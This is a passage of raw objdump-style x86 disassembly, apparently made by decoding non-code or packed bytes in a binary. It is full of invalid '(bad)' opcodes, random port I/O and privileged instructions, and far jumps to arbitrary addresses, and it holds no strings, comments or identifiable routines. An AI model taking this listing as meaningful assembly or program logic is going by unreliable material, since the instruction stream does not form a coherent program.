  40f8fa:	rcr    DWORD PTR [ebp-0x66],cl
  40f8fd:	and    dl,dh
  40f8ff:	sub    al,0xbd
  40f901:	in     eax,dx
  40f902:	shl    BYTE PTR [eax],0x30
  40f905:	inc    edi
  40f906:	stc    
  40f907:	inc    esp
  40f908:	dec    ebx
  40f909:	xchg   esp,eax
  40f90a:	lods   eax,DWORD PTR ds:[esi]
  40f90b:	neg    DWORD PTR [edx+0x32f734af]
  40f911:	leave  
  40f912:	sahf   
  40f913:	stc    
  40f914:	(bad)  
  40f915:	xor    al,dl
  40f917:	in     al,dx
  40f918:	pop    edi
  40f919:	aad    0xae
  40f91b:	mov    esi,0xbd6d2bcc
  40f920:	inc    eax
  40f921:	(bad)  
  40f922:	adc    ch,BYTE PTR [ecx]
  40f924:	mov    ch,0x90
  40f926:	aaa    
  40f927:	mov    esp,0x8ebd744d
  40f92c:	(bad)  
  40f92d:	lods   eax,DWORD PTR ds:[esi]
  40f92e:	idiv   dh
  40f930:	ja     0x40f92b
  40f932:	inc    edx
  40f933:	je     0x40f8c1
  40f935:	push   es
  40f936:	pop    es
  40f937:	adc    eax,0x7e342a82
  40f93c:	sti    
  40f93d:	adc    ch,ch
  40f93f:	push   es
  40f940:	lahf   
  40f941:	inc    ebp
  40f942:	test   eax,0x39c6f19
  40f947:	xchg   eax,edx
  40f949:	pop    ebp
  40f94a:	iret   
  40f94b:	xchg   esi,eax
  40f94c:	jne    0x40f966
  40f94e:	lock call 0x2d7c:0xf0717434
  40f956:	pop    ebp
  40f957:	cmc    
  40f958:	clc    
  40f959:	sub    al,BYTE PTR [esi+0x791683ec]
  40f95f:	imul   ebp,DWORD PTR [ecx],0xffffff87
  40f962:	cmp    DWORD PTR [ebp-0x6646317e],eax
  40f968:	xor    al,al
  40f96a:	or     DWORD PTR [ebp-0x41],0x0
  40f96e:	and    ch,0xf6
  40f971:	std    
  40f972:	cmp    BYTE PTR [ebp+0x4c077af9],ch
  40f978:	dec    eax
  40f979:	lds    esp,FWORD PTR [edx-0x41f6922d]
  40f97f:	fdivp  st(0),st
  40f981:	mov    eax,0x221d8b8a
  40f986:	and    al,0x38
  40f988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f989:	xchg   ecx,eax
  40f98a:	aam    0x58
  40f98c:	dec    esp
  40f98d:	repnz enter 0x205f,0x5e
  40f992:	outs   dx,BYTE PTR ds:[esi]
  40f993:	data16 mov ah,0x17
  40f996:	mov    bh,0xc9
  40f998:	mov    al,0x2d
  40f99a:	inc    ebx
  40f99b:	sbb    BYTE PTR [edx-0xa],bl
  40f99e:	adc    ebx,DWORD PTR [edx+0x9857074]
  40f9a4:	ffree  st(3)
  40f9a6:	add    esi,DWORD PTR [esi+0x1d]
  40f9a9:	mov    ecx,0xa0359c05
  40f9ae:	test   DWORD PTR [ebx-0x65],ebx
  40f9b1:	fisubr DWORD PTR [edi+0x1bd7da5c]
  40f9b7:	jle    0x40f9d3
  40f9b9:	(bad)  
  40f9ba:	aam    0xc4
  40f9bc:	gs xor edi,ebx
  40f9bf:	stos   BYTE PTR es:[edi],al
  40f9c0:	rol    BYTE PTR [ebx-0x19],cl
  40f9c3:	jle    0x40f9c1
  40f9c5:	adc    al,0x94
  40f9c7:	shl    bl,cl
  40f9c9:	mov    bh,0xfb
  40f9cb:	lods   al,BYTE PTR ds:[esi]
  40f9cc:	stos   DWORD PTR es:[edi],eax
  40f9cd:	icebp  
  40f9ce:	push   es
  40f9cf:	shl    eax,1
  40f9d1:	sar    BYTE PTR [ebx],cl
  40f9d3:	loope  0x40fa27
  40f9d5:	add    BYTE PTR [esi],bl
  40f9d7:	mov    edx,DWORD PTR [ecx]
  40f9d9:	(bad)  
  40f9da:	pusha  
  40f9db:	dec    ecx
  40f9dc:	mov    eax,ds:0x31d9c0fa
  40f9e1:	mov    dl,0x35
  40f9e3:	xor    edx,ecx
  40f9e5:	jecxz  0x40f9a7
  40f9e7:	inc    ecx
  40f9e8:	cmp    DWORD PTR [ebx],0x72
  40f9eb:	ds test bh,dl
  40f9ee:	fisub  WORD PTR [ecx+0x48]
  40f9f1:	sub    al,0xd9
  40f9f3:	xor    dh,BYTE PTR [eax+0x377bfb3]
  40f9f9:	inc    ebx
  40f9fa:	pop    edi
  40f9fb:	(bad)  
  40f9fd:	popf   
  40f9fe:	push   ebx
  40f9ff:	fisubr WORD PTR [edx]
  40fa01:	push   eax
  40fa02:	pop    eax
  40fa03:	and    ah,cl
  40fa05:	mov    edi,0x8fa9989f
  40fa0a:	adc    ch,al
  40fa0c:	push   edx
  40fa0d:	and    eax,0x526b3d69
  40fa12:	je     0x40fa8f
  40fa14:	cmp    al,0x3
  40fa16:	cmp    DWORD PTR [eax],esi
  40fa18:	leave  
  40fa19:	nop
  40fa1a:	stos   BYTE PTR es:[edi],al
  40fa1b:	lea    ebp,[eax]
  40fa1d:	pusha  
  40fa1e:	mov    dh,0xc5
  40fa20:	pop    ebx
  40fa21:	jecxz  0x40f9e0
  40fa23:	ins    DWORD PTR es:[edi],dx
  40fa24:	and    eax,0xd5d3ba3f
  40fa29:	popf   
  40fa2a:	loopne 0x40f9b4
  40fa2c:	je     0x40f9f6
  40fa2e:	mov    ds:0xdbca6e4a,al
  40fa33:	inc    esp
  40fa34:	jnp    0x40fa4c
  40fa36:	test   DWORD PTR [ecx],eax
  40fa38:	mov    esp,0xdf06c04f
  40fa3d:	cmp    al,0xa2
  40fa3f:	ret    0x2e83
  40fa42:	add    esi,DWORD PTR [eax+ecx*8+0x3c934828]
  40fa49:	mov    edx,0x14b7954b
  40fa4e:	add    BYTE PTR [ecx-0x5e40066d],0x20
  40fa55:	mov    esi,0xafab0e76
  40fa5a:	mov    ds:0xe084c367,al
  40fa5f:	add    BYTE PTR [eax+0x11513f00],al
  40fa65:	nop
  40fa66:	mov    bh,0xf9
  40fa68:	in     eax,0x7c
  40fa6a:	mov    edx,0x90810f7e
  40fa6f:	mov    edi,0xbcf42990
  40fa74:	dec    eax
  40fa75:	mov    ecx,0x86e324c
  40fa7a:	xor    BYTE PTR [esi+0x44154897],ah
  40fa80:	mov    ds,edx
  40fa82:	cwde   
  40fa83:	sub    al,al
  40fa85:	clc    
  40fa86:	leave  
  40fa87:	mov    edi,0x58e1f02a
  40fa8c:	mov    eax,ds:0x1040ffe6
  40fa91:	cmp    eax,0x80670222
  40fa96:	jns    0x40fa2c
  40fa98:	fld    QWORD PTR [ebp-0x19e2a6e1]
  40fa9e:	pop    edx
  40fa9f:	pop    esp
  40faa0:	mov    dh,0xa6
  40faa2:	(bad)  
  40faa3:	cmp    esi,DWORD PTR ds:0xd130e696
  40faa9:	inc    esp
  40faaa:	add    dh,BYTE PTR [edx]
  40faac:	fldenv [esi-0x4b0bd3b1]
  40fab2:	loop   0x40fa37
  40fab4:	arpl   ax,bx
  40fab6:	jae    0x40fb24
  40fab8:	aam    0xd4
  40faba:	neg    BYTE PTR [edx-0x7d422bf]
  40fac0:	or     esp,eax
  40fac2:	out    dx,eax
  40fac3:	test   eax,0x94cb4164
  40fac8:	jbe    0x40fac8
  40faca:	sbb    edi,DWORD PTR [ecx]
  40facc:	or     edi,DWORD PTR [edi]
  40face:	inc    esi
  40facf:	rcl    BYTE PTR [edi+ebp*8-0x7cdd4121],0x72
  40fad7:	dec    edx
  40fad8:	test   al,0x3e
  40fada:	in     al,dx
  40fadb:	fist   WORD PTR ss:[edi]
  40fade:	inc    ebx
  40fadf:	dec    edx
  40fae0:	mov    esi,0x54b55a6c
  40fae5:	dec    ebp
  40fae6:	and    edx,0x1e
  40fae9:	imul   BYTE PTR [ebp+0xf8e733e]
  40faef:	push   es
  40faf0:	stos   DWORD PTR es:[edi],eax
  40faf1:	add    al,0xed
  40faf3:	lods   eax,DWORD PTR ds:[esi]
  40faf4:	imul   ah
  40faf6:	mov    al,BYTE PTR [esi]
  40faf8:	ins    DWORD PTR es:[edi],dx
  40faf9:	pop    edi
  40fafa:	push   ebp
  40fafb:	push   0x4
  40fafd:	xchg   ecx,eax
  40fafe:	jbe    0x40fb00
  40fb00:	mov    WORD PTR [edi],?
  40fb02:	mov    al,ds:0x9b2a4e69
  40fb07:	arpl   dx,cx
  40fb09:	mov    es,WORD PTR [edx+esi*8+0x439810d1]
  40fb10:	jbe    0x40fadc
  40fb12:	sbb    al,al
  40fb14:	sbb    BYTE PTR ds:0x832bcef,0x62
  40fb1b:	rol    DWORD PTR [ecx],cl
  40fb1d:	dec    eax
  40fb1e:	jmp    0x40fb7d
  40fb20:	and    esi,DWORD PTR [ebx+0x4d45f6e2]
  40fb26:	or     DWORD PTR [esi+0x73],ecx
  40fb29:	ss in  eax,0x7d
  40fb2c:	out    dx,eax
  40fb2d:	popf   
  40fb2e:	push   edi
  40fb2f:	or     eax,0x4802fd7b
  40fb34:	jae    0x40fb38
  40fb36:	add    ebx,ebp
  40fb38:	sbb    esi,eax
  40fb3a:	nop
  40fb3b:	mov    ebx,0x1ba6a33
  40fb40:	sar    BYTE PTR [edi+0x339c8980],0xf3
  40fb47:	cmp    al,0x3e
  40fb49:	cmc    
  40fb4a:	sbb    eax,0x3ceb6ef2
  40fb4f:	repz mov bl,ch
  40fb52:	js     0x40fb48
  40fb54:	push   cs
  40fb55:	sub    al,0xeb
  40fb57:	jmp    0x40fbd0
  40fb59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb5a:	fdivr  DWORD PTR [edi+0xc]
  40fb5d:	inc    eax
  40fb5e:	push   ecx
  40fb5f:	pop    esp
  40fb60:	dec    esi
  40fb61:	adc    eax,0x2893bbdf
  40fb66:	inc    esp
  40fb67:	clc    
  40fb68:	sbb    DWORD PTR [edx-0x4f],ebp
  40fb6b:	dec    ebp
  40fb6c:	sub    al,0xcb
  40fb6e:	inc    edi
  40fb6f:	dec    esp
  40fb70:	inc    ecx
  40fb71:	jecxz  0x40fb36
  40fb73:	(bad)  
  40fb75:	push   cs
  40fb76:	std    
  40fb77:	lods   eax,DWORD PTR ds:[esi]
  40fb78:	(bad)  
  40fb79:	jg     0x40fb09
  40fb7b:	pop    eax
  40fb7c:	push   esi
  40fb7d:	(bad)  
  40fb7e:	push   ebx
  40fb7f:	pop    ebp
  40fb80:	adc    dh,BYTE PTR [ecx+0x1fd43e73]
  40fb86:	sub    al,0x80
  40fb88:	aas    
  40fb89:	fdivr  QWORD PTR [ecx+0x49]
  40fb8c:	ins    BYTE PTR es:[edi],dx
  40fb8d:	jmp    0x341d:0xd31ecda5
  40fb94:	call   0x1bdb52d3
  40fb99:	jle    0x40fb27
  40fb9b:	inc    esi
  40fb9c:	ror    BYTE PTR [edx-0x574ccf2d],cl
  40fba2:	jl     0x40fbcf
  40fba4:	stos   BYTE PTR es:[edi],al
  40fba5:	add    al,0x62
  40fba7:	jno    0x40fb9d
  40fba9:	gs call 0xf072b76a
  40fbaf:	lds    eax,FWORD PTR [eax-0x47]
  40fbb2:	adc    eax,0xcc4cb31f
  40fbb7:	dec    ecx
  40fbb8:	sbb    DWORD PTR [edi+0x3329a8d9],0xee540731
  40fbc2:	push   edi
  40fbc3:	fwait
  40fbc4:	mul    ecx
  40fbc6:	jae    0x40fc3d
  40fbc8:	mov    esi,0x8a5788e4
  40fbcd:	inc    eax
  40fbce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbcf:	aad    0x75
  40fbd1:	hlt    
  40fbd2:	jmp    0x70a4:0xa323b91f
  40fbd9:	daa    
  40fbda:	add    ah,ch
  40fbdc:	add    bh,al
  40fbde:	jae    0x40fb92
  40fbe0:	rcr    cl,0x8c
  40fbe3:	out    dx,eax
  40fbe4:	mov    WORD PTR [eax],es
  40fbe6:	dec    esp
  40fbe7:	sti    
  40fbe8:	mov    ds:0x148c9f0b,eax
  40fbed:	jno    0x40fb94
  40fbef:	sar    BYTE PTR [esi+0x33],cl
  40fbf2:	fwait
  40fbf3:	les    ebp,FWORD PTR [ecx]
  40fbf5:	fmul   st,st(0)
  40fbf7:	cmp    edx,DWORD PTR [edx+0x2]
  40fbfa:	es push ds
  40fbfc:	fisub  WORD PTR [esi]
  40fbfe:	scas   al,BYTE PTR es:[edi]
  40fbff:	les    esi,FWORD PTR [ebx-0x36185393]
  40fc05:	and    edi,ecx
  40fc07:	mov    cl,ch
  40fc09:	xchg   ebx,eax
  40fc0a:	daa    
  40fc0b:	fadd   DWORD PTR [ebp+edx*1+0x6c29537b]
  40fc12:	mov    ds:0x4b5a5e42,al
  40fc17:	sbb    edx,ecx
  40fc19:	dec    edi
  40fc1a:	bound  edx,QWORD PTR [edi+0x78f2f7e9]
  40fc20:	dec    ecx
  40fc21:	cwde   
  40fc22:	jmp    0x3615f221
  40fc27:	cmp    DWORD PTR [edx-0x54],0x356c6c57
  40fc2e:	jle    0x40fc0b
  40fc30:	retf   
  40fc31:	or     eax,0x9d96c14f
  40fc36:	and    edx,DWORD PTR [esi]
  40fc38:	leave  
  40fc39:	adc    BYTE PTR [edi],dl
  40fc3b:	mov    edi,0x1bf3db72
  40fc40:	into   
  40fc41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc42:	ins    BYTE PTR es:[edi],dx
  40fc43:	mov    eax,ds:0xc04e6bf
  40fc48:	repz je 0x40fc16
  40fc4b:	adc    cl,al
  40fc4d:	and    BYTE PTR [esi-0x4d],0xef
  40fc51:	daa    
  40fc52:	repz mov dh,0xac
  40fc55:	nop
  40fc56:	cli    
  40fc57:	inc    esp
  40fc58:	mov    esi,0xfb6601af
  40fc5d:	(bad)  
  40fc5e:	xor    ebp,eax
  40fc60:	pop    esp
  40fc61:	aas    
  40fc62:	rol    bh,cl
  40fc64:	in     al,dx
  40fc65:	pop    ebp
  40fc66:	pop    ecx
  40fc67:	or     esi,ebp
  40fc69:	jbe    0x40fc80
  40fc6b:	cmp    esi,edi
  40fc6d:	scas   eax,DWORD PTR es:[edi]
  40fc6e:	pop    es
  40fc6f:	xchg   edx,eax
  40fc70:	in     al,0x8b
  40fc72:	ins    BYTE PTR es:[edi],dx
  40fc73:	fisttp DWORD PTR [esi+eax*8+0x3c]
  40fc77:	inc    edx
  40fc78:	mov    edi,0x89182ba0
  40fc7d:	push   edx
  40fc7e:	sbb    al,0x54
  40fc80:	dec    esp
  40fc81:	data16 lahf 
  40fc83:	jo     0x40fce9
  40fc85:	jp     0x40fcd0
  40fc87:	imul   edi,DWORD PTR [edx+0x56],0x5c
  40fc8b:	repz in eax,dx
  40fc8d:	mov    edi,0x2776dd0d
  40fc92:	cmc    
  40fc93:	mov    esi,0x8cbc8365
  40fc98:	lock xor DWORD PTR [edx+0x1cb15ee],eax
  40fc9f:	mov    ebp,0x9343716a
  40fca4:	addr16 dec esi
  40fca6:	sbb    al,0xd5
  40fca8:	jp     0x40fce5
  40fcaa:	cs in  eax,0x79
  40fcad:	sbb    bh,ah
  40fcaf:	xchg   ebp,eax
  40fcb0:	inc    esi
  40fcb1:	pusha  
  40fcb2:	mov    ch,0x57
  40fcb4:	adc    BYTE PTR [esi-0x69],dl
  40fcb7:	xchg   ecx,eax
  40fcb8:	je     0x40fc73
  40fcba:	xor    esp,DWORD PTR [ebp+0x25]
  40fcbd:	nop
  40fcbe:	mov    dl,0x42
  40fcc0:	push   cs
  40fcc1:	out    0x6e,eax
  40fcc3:	mov    esi,DWORD PTR [eax+0x685e6271]
  40fcc9:	and    al,BYTE PTR [edi+ebp*1+0x9]
  40fccd:	les    edx,FWORD PTR ds:0x7be166f0
  40fcd3:	xchg   edi,eax
  40fcd4:	fwait
  40fcd5:	mov    edi,0x7e0b2716
  40fcda:	sbb    bl,ah
  40fcdc:	mov    ds:0xfb675e94,eax
  40fce1:	or     cl,BYTE PTR [ebx+0x35]
  40fce4:	mov    bl,0xd9
  40fce6:	add    eax,0x8fbe0d6a
  40fceb:	pop    ebp
  40fcec:	stos   BYTE PTR es:[edi],al
  40fced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcee:	fidiv  DWORD PTR [edi+0x923c627]
  40fcf4:	xrstors [eax]
  40fcf7:	je     0x40fcaa
  40fcf9:	mov    ebp,0x957788e0
  40fcfe:	lods   al,BYTE PTR ds:[esi]
  40fcff:	(bad)  
  40fd00:	xchg   ebx,eax
  40fd01:	pop    edi
  40fd02:	scas   al,BYTE PTR es:[edi]
  40fd03:	cli    
  40fd04:	inc    ebp
  40fd05:	push   esi
  40fd06:	aaa    
  40fd07:	adc    bh,ah
  40fd09:	xchg   ebx,eax
  40fd0a:	inc    ecx
  40fd0b:	int    0xfc
  40fd0d:	enter  0x97d8,0x34
  40fd11:	xchg   sp,ax
  40fd13:	or     al,0xd0
  40fd15:	cli    
  40fd16:	jl     0x40fd00
  40fd18:	mov    ecx,0xdf3e51c4
  40fd1d:	add    BYTE PTR [ebp-0x4e],bl
  40fd20:	test   DWORD PTR [edi+0x7a],ecx
  40fd23:	mov    ebx,DWORD PTR [eax-0x62]
  40fd26:	mov    esi,0x9b357c68
  40fd2b:	cwde   
  40fd2c:	mov    al,0xf6
  40fd2e:	inc    esp
  40fd2f:	mov    edi,0xcf2540a0
  40fd34:	fiadd  DWORD PTR [esi+0x7b9fb5ad]
  40fd3a:	xor    esp,DWORD PTR [ebx-0x139ab48]
  40fd40:	jg     0x40fce1
  40fd42:	enter  0xac48,0x5e
  40fd46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd47:	mov    ds:0xfdfd0d39,al
  40fd4c:	test   DWORD PTR [ecx+0x7112bb2c],ebx
  40fd52:	loope  0x40fda2
  40fd54:	push   cs
  40fd55:	xlat   BYTE PTR ds:[ebx]
  40fd56:	adc    DWORD PTR ds:0xdd9a5890,esi
  40fd5c:	test   DWORD PTR [bx],0xb576f536
  40fd63:	push   esp
  40fd64:	aaa    
  40fd65:	or     al,0xff
  40fd67:	das    
  40fd68:	pop    ebx
  40fd69:	cdq    
  40fd6a:	cwde   
  40fd6b:	ret    
  40fd6c:	jb     0x40fdc1
  40fd6e:	dec    eax
  40fd6f:	xchg   esp,eax
  40fd70:	push   ss
  40fd71:	ins    BYTE PTR es:[edi],dx
  40fd72:	aaa    
  40fd73:	outs   dx,BYTE PTR ds:[esi]
  40fd74:	sbb    DWORD PTR [ecx+0x47],edi
  40fd77:	or     eax,0x15243f6b
  40fd7c:	pop    esi
  40fd7d:	mov    esp,0x5930e1d8
  40fd82:	mov    dl,0x13
  40fd84:	test   BYTE PTR [edi+eiz*2+0x42],ah
  40fd88:	ins    BYTE PTR es:[edi],dx
  40fd89:	das    
  40fd8a:	cdq    
  40fd8b:	jp     0x40fdb8
  40fd8d:	and    DWORD PTR [eax],esi
  40fd8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd90:	cli    
  40fd91:	aaa    
  40fd92:	xchg   esi,eax
  40fd93:	and    bl,BYTE PTR [esi+edi*8-0x29]
  40fd97:	test   eax,0x7ae4f3df
  40fd9c:	mov    ds:0x212e92ff,al
  40fda1:	div    BYTE PTR ds:0x9d19c53b
  40fda7:	in     eax,0x62
  40fda9:	jbe    0x40fdf4
  40fdab:	retf   0xe11c
  40fdae:	xor    eax,0x1d698002
  40fdb3:	xchg   edi,eax
  40fdb4:	or     DWORD PTR [esi+0x666492eb],esp
  40fdba:	icebp  
  40fdbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdbc:	std    
  40fdbd:	and    eax,0x8822e302
  40fdc2:	test   ebp,0x61438606
  40fdc8:	shr    BYTE PTR [edx-0x7],1
  40fdcb:	cld    
  40fdcc:	call   0x5a261bd5
  40fdd1:	jno    0x40fd70
  40fdd3:	dec    ecx
  40fdd4:	loope  0x40fd8c
  40fdd6:	push   cs
  40fdd7:	xlat   BYTE PTR ds:[ebx]
  40fdd8:	stos   BYTE PTR es:[edi],al
  40fdd9:	jmp    0xeeca72a8
  40fdde:	pop    ds
  40fddf:	mov    edi,cs
  40fde1:	mov    BYTE PTR [ecx+0x3f],bh
  40fde4:	jb     0x40fdda
  40fde6:	dec    eax
  40fde7:	arpl   WORD PTR [eax],di
  40fde9:	bound  ebx,QWORD PTR [ecx+0x40]
  40fdec:	jno    0x40fd9c
  40fdee:	ja     0x40fe4f
  40fdf0:	mov    bh,0x31
  40fdf2:	outs   dx,DWORD PTR ds:[esi]
  40fdf3:	dec    eax
  40fdf4:	push   ebx
  40fdf5:	jmp    0xad65d123
  40fdfa:	test   DWORD PTR [ebx],0xa423314c
  40fe00:	dec    esi
  40fe01:	pop    esp
  40fe02:	push   edi
  40fe03:	pop    es
  40fe04:	xchg   esp,eax
  40fe05:	mov    bh,0xf1
  40fe07:	push   edi
  40fe08:	push   ecx
  40fe09:	mov    bl,0x3d
  40fe0b:	into   
  40fe0c:	xor    DWORD PTR [edx+0x9],edx
  40fe0f:	into   
  40fe10:	add    BYTE PTR [ebx-0x2a],bh
  40fe13:	inc    esp
  40fe14:	fisttp QWORD PTR [eax+0x42]
  40fe17:	les    ebp,FWORD PTR [ebp+0x134a736b]
  40fe1d:	hlt    
  40fe1e:	stos   BYTE PTR es:[edi],al
  40fe1f:	out    0xc1,al
  40fe21:	lahf   
  40fe22:	(bad)  
  40fe24:	(bad)  
  40fe25:	(bad)  
  40fe26:	mov    edx,0x403d7330
  40fe2b:	in     al,dx
  40fe2c:	jne    0x40fe84
  40fe2e:	pop    ss
  40fe2f:	not    ah
  40fe31:	jg     0x40fe4d
  40fe33:	call   0xad88:0xf2e72a08
  40fe3a:	f2xm1  
  40fe3c:	or     cl,ah
  40fe3e:	retf   
  40fe3f:	outs   dx,BYTE PTR ds:[esi]
  40fe40:	stc    
  40fe41:	sbb    eax,esi
  40fe43:	jne    0x40feb3
  40fe45:	sbb    cl,BYTE PTR [ecx]
  40fe47:	xor    DWORD PTR [esp+eiz*4+0x61073f84],edi
  40fe4e:	inc    ebp
  40fe4f:	push   0x7647e6bb
  40fe54:	(bad)  
  40fe55:	mov    WORD PTR [eax+ecx*4],ss
  40fe58:	enter  0xc54f,0x5a
  40fe5c:	xchg   ebx,eax
  40fe5d:	mov    cl,0x4e
  40fe5f:	mov    al,0x3b
  40fe61:	pushf  
  40fe62:	and    al,0xd8
  40fe64:	int    0xae
  40fe66:	test   eax,0x7eea227c
  40fe6b:	mov    edi,0xc907db63
  40fe70:	sub    eax,0xb344f405
  40fe75:	addr16 pop ebp
  40fe77:	cmp    al,ah
  40fe79:	mov    ?,edi
  40fe7b:	jle    0x40fe69
  40fe7d:	fst    QWORD PTR [edx]
  40fe7f:	ds aam 0x9b
  40fe82:	mov    ebp,0x19afa5b8
  40fe87:	rcr    DWORD PTR [ebp+0x20473082],cl
  40fe8d:	inc    esi
  40fe8e:	cmc    
  40fe8f:	test   al,0x2e
  40fe91:	inc    esi
  40fe92:	fsubr  QWORD PTR es:[esi+esi*8-0x43]
  40fe97:	enter  0xa218,0x1e
  40fe9b:	xchg   edi,eax
  40fe9c:	mov    ecx,0xff912b5b
  40fea1:	sub    al,0x71
  40fea3:	and    DWORD PTR [ebx+0x7389fd38],ebp
  40fea9:	(bad)  [esp+eax*8]
  40feac:	ins    DWORD PTR es:[edi],dx
  40fead:	or     al,0x4d
  40feaf:	(bad)  
  40feb0:	mov    edx,0x577104b6
  40feb5:	inc    esp
  40feb6:	mov    al,ds:0x81531eae
  40febb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40febc:	cli    
  40febd:	(bad)  [edx-0x3293d6a6]
  40fec3:	mov    ?,WORD PTR [edx-0x7f]
  40fec6:	ss ret 
  40fec8:	sbb    al,0x5d
  40feca:	jo     0x40ff33
  40fecc:	xchg   esp,eax
  40fecd:	stos   DWORD PTR es:[edi],eax
  40fece:	lods   eax,DWORD PTR ds:[esi]
  40fecf:	fsubr  QWORD PTR [ebx+0x7e249c80]
  40fed5:	mov    ebp,0xe9f1b440
  40feda:	xor    bl,BYTE PTR [ebx-0x3047202d]
  40fee0:	and    DWORD PTR [ecx+eax*1-0x5c],esi
  40fee4:	stos   BYTE PTR es:[edi],al
  40fee5:	fbld   TBYTE PTR [ecx+0x6ba55166]
  40feeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feec:	je     0x40feba
  40feee:	jg     0x40fee1
  40fef0:	mov    bl,0xbf
  40fef2:	inc    esp
  40fef3:	icebp  
  40fef4:	mov    BYTE PTR [ebx-0x18d99ccd],0x39
  40fefb:	cmp    eax,0x53056ab
  40ff00:	call   0x6b33:0xdb0b32e1
  40ff07:	push   ebp
  40ff08:	jo     0x40ff44
  40ff0a:	pushf  
  40ff0b:	ja     0x40fe90
  40ff0d:	aam    0xf3
  40ff0f:	imul   esp,DWORD PTR [ecx-0x4c],0xffffff90
  40ff13:	nop
  40ff14:	pusha  
  40ff15:	imul   ecx,DWORD PTR [esp+edx*2-0x7f],0x700d2637
  40ff1d:	pop    eax
  40ff1e:	or     al,0xd3
  40ff20:	in     al,0x62
  40ff22:	mov    BYTE PTR [ebx+0x30],ah
  40ff25:	xlat   BYTE PTR ds:[ebx]
  40ff26:	mov    ebp,0x1ad6d6c4
  40ff2b:	xor    cl,ch
  40ff2d:	nop
  40ff2e:	in     eax,dx
  40ff2f:	das    
  40ff30:	inc    esi
  40ff31:	mov    ebp,0xf7d725d7
  40ff36:	sub    eax,0x46b1129f
  40ff3b:	stos   BYTE PTR es:[edi],al
  40ff3c:	cmp    ebp,ebp
  40ff3e:	and    al,BYTE PTR [ebx+0x7b395874]
  40ff44:	jmp    0xb73f5366
  40ff49:	retf   0x4485
  40ff4c:	jle    0x40ff89
  40ff4e:	mov    edx,0xe333a95c
  40ff53:	and    bh,bh
  40ff55:	add    DWORD PTR [ecx+0xe],0x5c65bd80
  40ff5c:	inc    edi
  40ff5d:	stos   DWORD PTR es:[edi],eax
  40ff5e:	and    esp,DWORD PTR [eax-0x6b]
  40ff61:	sar    DWORD PTR [esi],0xc0
  40ff64:	jmp    0xd72ebd13
  40ff69:	jge    0x40ff48
  40ff6b:	add    BYTE PTR [ebx+0x40],al
  40ff6e:	push   ebp
  40ff6f:	into   
  40ff70:	lods   eax,DWORD PTR ds:[esi]
  40ff71:	sub    edx,esp
  40ff73:	mov    edx,0x6546002d
  40ff78:	mov    bh,0x22
  40ff7a:	jge    0x40ff39
  40ff7c:	ins    DWORD PTR es:[edi],dx
  40ff7d:	jmp    0x40ff17
  40ff7f:	jns    0x40ffc8
  40ff81:	popf   
  40ff82:	mov    edi,0xa7a41552
  40ff87:	push   ss
  40ff88:	cmc    
  40ff89:	iret   
  40ff8a:	in     al,0x3c
  40ff8c:	or     ebp,eax
  40ff8e:	out    0x60,eax
  40ff90:	push   0xffffffb0
  40ff92:	push   edx
  40ff93:	gs mov ecx,0xd1c64f8b
  40ff99:	pop    eax
  40ff9a:	stos   DWORD PTR es:[edi],eax
  40ff9b:	inc    esp
  40ff9c:	add    al,0x73
  40ff9e:	jp     0x40ffac
  40ffa0:	jae    0x40ff81
  40ffa2:	int    0x4e
  40ffa4:	jno    0x40ffb7
  40ffa6:	stc    
  40ffa7:	call   0x80135e94
  40ffac:	out    0xd6,eax
  40ffae:	and    BYTE PTR [ecx-0x12190af5],dl
  40ffb4:	mov    eax,0x59443292
  40ffb9:	cmp    BYTE PTR [ecx-0x40],al
  40ffbc:	icebp  
  40ffbd:	sub    eax,0x76d0f1df
  40ffc2:	sub    ebx,DWORD PTR [ebx]
  40ffc4:	arpl   WORD PTR [edi+0x1],cx
  40ffc7:	loop   0x410018
  40ffc9:	mov    ds:0x831dd609,eax
  40ffce:	push   0xcc02959
  40ffd3:	arpl   WORD PTR [ebp+edx*2-0x4a89781a],bx
  40ffda:	mov    edx,0xfa9f25fb
  40ffdf:	sbb    al,BYTE PTR [ebx+0x761a2e43]
  40ffe5:	repz into 
  40ffe7:	aad    0x34
  40ffe9:	or     al,0xe
  40ffeb:	ds stc 
  40ffed:	je     0x410043
  40ffef:	call   0x27f6:0x69a26222
  40fff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fff7:	lahf   
  40fff8:	cs into 
  40fffa:	dec    esp
  40fffb:	jbe    0x410077
  40fffd:	adc    BYTE PTR [edi],dh
  40ffff:	inc    edi
  410000:	cmp    eax,0xe65333e1
  410005:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  410007:	vxorps xmm7,xmm6,xmm5
  41000b:	addr16 (bad) 
  41000d:	cmp    DWORD PTR [edx+0x4ab05059],ebp
  410013:	addr16 std 
  410015:	into   
  410016:	push   es
  410017:	lods   al,BYTE PTR ds:[esi]
  410018:	xchg   BYTE PTR [ebp-0x3aaf75cc],bl
  41001e:	arpl   WORD PTR [edi+0x418bfb0e],cx
  410024:	out    0xec,eax
  410026:	out    0x81,al
  410028:	fstp   QWORD PTR [ecx-0x4858cc80]
  41002e:	adc    edi,DWORD PTR [edx+0x1e]
  410031:	jmp    0x6da43d64
  410036:	adc    esi,DWORD PTR [ecx+0x3fd81d04]
  41003c:	jae    0x4100a8
  41003e:	lahf   
  41003f:	stos   DWORD PTR es:[edi],eax
  410040:	xor    eax,DWORD PTR ds:0x47ae2d67
  410046:	sbb    esi,eax
  410048:	inc    eax
  410049:	and    eax,0x69158bfb
  41004e:	sbb    eax,0xf49da16b
  410053:	test   BYTE PTR [esi+edx*8],0x15
  410057:	mov    ch,0x3a
  410059:	(bad)  
  41005a:	iret   
  41005b:	add    eax,0x5c4ef78c
  410060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410061:	imul   ecx,DWORD PTR [ecx-0x75389d7c],0xaeabf2bc
  41006b:	leave  
  41006c:	inc    esi
  41006d:	push   ds
  41006e:	clc    
  41006f:	fst    st(7)
